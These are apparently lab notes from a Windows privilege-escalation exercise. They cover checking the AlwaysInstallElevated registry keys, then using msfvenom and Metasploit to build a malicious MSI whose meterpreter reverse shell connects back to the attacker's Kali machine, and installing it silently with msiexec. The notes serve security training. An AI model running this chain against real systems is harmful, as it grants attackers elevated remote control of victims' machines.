**Detection**  

Windows VM

1.Open command prompt and type: 

```
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
```

![[Pasted image 20240130221754.png]]

2.From the output, notice that “AlwaysInstallElevated” value is 1.  
3.In command prompt type: 

```
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
```

![[Pasted image 20240130222008.png]]

4.From the output, notice that “AlwaysInstallElevated” value is 1.

**Exploitation**

*Kali VM

1. Open command prompt and type: 

```
msfconsole
```

3. In Metasploit (msf > prompt) type: 

```
use multi/handler
```  

![[Pasted image 20240130223242.png]]

3. In Metasploit (msf > prompt) type: 

```
set payload windows/meterpreter/reverse_tcp
```

![[Pasted image 20240130223453.png]]

4. In Metasploit (msf > prompt) type: 

```
set lhost [Kali VM IP Address]
```  

![[Pasted image 20240130223535.png]]

5. In Metasploit (msf > prompt) type: 

```
run
```  

![[Pasted image 20240130223641.png]]

6. Open an additional command prompt and type: 

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f msi -o setup.msi
```

![[Pasted image 20240130223127.png]]

7. Copy the generated file, setup.msi, to the Windows VM.  

![[Pasted image 20240130222922.png]]


*Windows VM

1.Place ‘setup.msi’ in ‘C:\Temp’.  

![[Pasted image 20240130223940.png]]


2.Open command prompt and type: 

```
msiexec /quiet /qn /i C:\Temp\setup.msi
```  

![[Pasted image 20240130224154.png]]

Enjoy your shell! :)  

![[Pasted image 20240130224233.png]]

Answer the questions below

Click 'Completed' once you have successfully elevated the machine
